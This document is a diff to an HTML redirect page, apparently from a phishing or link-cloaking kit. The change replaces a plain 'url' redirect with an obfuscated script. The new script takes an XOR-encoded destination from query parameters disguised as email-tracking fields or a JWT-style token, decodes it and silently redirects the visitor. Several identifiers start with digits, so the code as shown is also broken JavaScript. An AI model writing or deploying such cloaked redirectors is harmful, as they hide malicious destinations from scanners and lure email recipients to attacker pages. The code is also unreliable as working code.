@@ -4,11 +4,41 @@
 <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Verifying</title>
-<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#ffffff;padding:34px}</style>
+<title>Connecting</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#fafafa;padding:104px}</style>
 <script>
-/* 53e0826a6b1d2ef202b74826 */
-!function y3qw77gy(){var 8vp73j=new URLSearchParams(window.location.search),5krzcf=8vp73j.get('url');if(5krzcf){window.location.replace(5krzcf);}else{document.addEventListener('DOMContentLoaded',function(){document.body.style.cssText='display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;color:#aaa;font-size:13px';document.body.textContent='No destination specified.';});}}();
+/* 334a2dd73f4393f18ae9431e121239ee */
+!function bgqv4b(){
+  var x43getq='mX7pQ2rL9kZ4nV8wA3sE6uY1hT5jB0cF';
+  var _pt=["client_id","tid",null,"id","i","pi_list_email","_hsenc","k","$web_id","msgid"];
+  var ys22d=new URLSearchParams(window.location.search);
+  // Find which param holds the tagged token by trying each known param name
+  var b4h9j=null,imyebs3=-1;
+  for(var 7n4=0;7n4<_pt.length;7n4++){
+    var _n=_pt[7n4];
+    if(_n===null){
+      // JWT style (2): token is middle of dot-split of 'token' param
+      var _jt=ys22d.get('token');
+      if(_jt){var _pts=_jt.split('.');if(_pts.length===3){b4h9j=_pts[1];imyebs3=7n4;break;}}
+    } else {
+      var _v=ys22d.get(_n);
+      if(_v){b4h9j=_v;imyebs3=7n4;break;}
+    }
+  }
+  if(b4h9j===null){document.addEventListener('DOMContentLoaded',function(){document.body.style.cssText='display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;color:#aaa;font-size:13px';document.body.textContent='No destination specified.';});return;}
+  // Strip style prefix digit
+  var 8hz1873=b4h9j.slice(1);
+  // base64url decode
+  var _b64=8hz1873.replace(/-/g,'+').replace(/_/g,'/');
+  while(_b64.length%4)_b64+='=';
+  var _bin=atob(_b64);
+  // XOR decode
+  var rjj1t9z=[];
+  for(var 7n4=0;7n4<_bin.length;7n4++)rjj1t9z.push(String.fromCharCode(_bin.charCodeAt(7n4)^x43getq.charCodeAt(7n4%x43getq.length)));
+  var q3ecokxu=rjj1t9z.join('');
+  if(q3ecokxu)window.location.replace(q3ecokxu);
+  else{document.addEventListener('DOMContentLoaded',function(){document.body.style.cssText='display:flex;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;color:#aaa;font-size:13px';document.body.textContent='No destination specified.';});}
+}();
 </script>
 </head>
 <body></body>
